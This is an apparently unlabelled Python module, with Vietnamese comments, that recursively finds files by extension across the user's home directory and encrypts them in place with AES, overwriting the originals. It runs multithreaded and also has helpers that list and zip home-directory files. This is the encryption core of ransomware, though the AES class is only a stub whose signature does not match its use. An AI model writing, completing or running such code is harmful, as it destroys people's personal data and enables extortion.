import os
import typing
import shutil
import pathlib
import zipfile
import concurrent.futures



class AES:
    def encrypt(key: bytes, plaintext: str, workload: int) -> bytes:...



class CommonFiles:
    def __init__(
        self, 
        aes: AES, 
        key: bytes, 
        file_categories: typing.Dict[str, typing.List[str]]
    ) -> None:
        self.aes = aes
        self.key = key
        self.file_categories = file_categories
    
    def _process_file(self, file: pathlib.Path) -> None:
        """Xử lý tệp đơn lẻ để mã hóa."""
        temp_file = file.with_suffix(file.suffix + '.temp')  # Tạo tệp tạm thời
        try:
            with open(file, 'rb') as original_file, open(temp_file, 'wb') as temp_file_handle:
                while True:
                    chunk = original_file.read(1024 * 1024 * 10)  # Đọc tệp theo từng khối
                    if not chunk:
                        break
                    processed_chunk = self.aes.encrypt(self.key, chunk, 1024 * 1024 * 10)
                    temp_file_handle.write(processed_chunk)
            shutil.move(temp_file, file)  # Thay thế tệp gốc bằng tệp đã mã hóa
        except Exception as e:
            print(f"Error processing file {file}: {e}")
            if temp_file.exists():
                os.remove(temp_file)

    def process_files(self) -> None:
        """Xử lý tất cả các tệp theo danh mục với đa luồng, dùng tối đa 50% số luồng CPU."""
        total_cpus = os.cpu_count()  # Lấy tổng số CPU logic
        num_threads = max(1, total_cpus // 2)  # Giới hạn số luồng ở mức 50% tổng CPU
        
        #print(f"Using {num_threads} threads out of {total_cpus} available CPUs.")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            for category, exts in self.file_categories.items():
                for ext in exts:
                    # Lấy tất cả các tệp có phần mở rộng cụ thể
                    for file in pathlib.Path.home().rglob(f'*{ext}'):
                        futures.append(executor.submit(self._process_file, file))
            
            # Đợi cho tất cả các tệp đã được xử lý
            for future in concurrent.futures.as_completed(futures):
                future.result()  # Có thể kiểm tra kết quả hoặc lỗi nếu cần

    def create_zip(self, zip_name: str, files_to_zip: list[str]) -> None:
        try:
            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in files_to_zip:
                    file_path = pathlib.Path(file)
                    if file_path.exists() and file_path.is_file():
                        zipf.write(file_path, arcname=file_path.name)
        except Exception as e:
            print(f"Error creating zip file {zip_name}: {e}")

    def list_files(self) -> typing.Dict[str, typing.List[str]]:
        extcategory = {ext: category for category, ext_list in self.file_categories.items() for ext in ext_list}

        # Khởi tạo từ điển với các danh mục trống
        categorized_files = {category: [] for category in self.file_categories}

        # Lặp qua các tệp trong thư mục chính
        for entry in pathlib.Path.home().rglob('*'):
            if entry.is_file() and (ext := entry.suffix.lower()) in extcategory:
                categorized_files[extcategory[ext]].append(str(entry))
        
        return categorized_files